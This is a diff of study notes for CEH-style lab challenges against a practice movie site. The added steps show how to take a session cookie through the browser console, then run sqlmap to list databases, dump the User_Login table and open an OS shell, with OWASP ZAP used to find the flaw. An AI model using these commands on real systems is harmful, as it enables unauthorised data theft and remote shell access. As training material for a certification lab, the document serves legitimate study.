@@ -417,15 +417,24 @@ Answer: 3
 **Challenge** 14: (we are here)
 Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)
 - Use credentials found in **Challenge** 2 to login.
-- Copy the cookie value of user session lee in inspect element console, type document.cookie
+**-once logged in -> go to user profile page and take note of the url, copy it in texteditor pluma
+**- right click and inspect anywhere, go to console tab and type "document.cookie" (by the >> arrow)
+**-Copy cookie value into texteditor pluma
+**- type in the following below, replace the first variable with url and 2nd variable with cookie value
 - sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --dbs
-- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
-- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump
+- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables  (ONE DASH on D)
+- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T User_Login --dump
 
 Answer: 5
+** from here if you need shell access same as above
+- sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
 
 **Challenge** 15:
 Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection (Format: NN)
+
+**get OWASPZAP by typing zaproxy on bash terminal.
+**new scan -> enter the website, then attack
+** Go to alert tab and look for the SQL injection alert which should show WASC ID
 - Search for WASC ID for SQL Injection in google
 
 Answer: 19
